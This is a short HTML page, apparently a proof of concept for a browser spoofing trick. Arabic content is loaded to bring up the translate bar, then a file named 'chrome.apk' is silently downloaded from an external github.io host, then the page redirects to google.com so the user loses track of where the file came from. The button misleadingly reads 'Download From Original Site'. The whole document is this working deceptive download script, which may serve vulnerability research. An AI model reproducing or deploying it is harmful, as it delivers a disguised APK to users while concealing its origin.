<!doctype html>
<html lang="ar">
<head>
  <meta charset="utf-8">
  <style>
    .button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 15px 32px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>

<body>

<script>
function a() {

  // 1. Konten Arab → trigger Translate UI
  document.body.innerHTML = `
    <h1>هذه صفحة اختبار</h1>
    <p>يرجى الانتظار، جارٍ تحميل المحتوى…</p>
  `;

  // 2. Delay agar Translate bar muncul
  setTimeout(function () {

    // 3. Trigger download
    var link = document.createElement('a');
    link.href = 'https://ecdnts-del.github.io/test-apk/chrome.apk';
    link.download = 'chrome.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    // 4. Redirect cepat → loss of context
    setTimeout(function () {
      window.location.href = "https://google.com";
    }, 300);

  }, 250);
}
</script>

<center>
  <input
    type="button"
    class="button"
    value="Download From Original Site"
    onclick="a()">
</center>

</body>
</html>
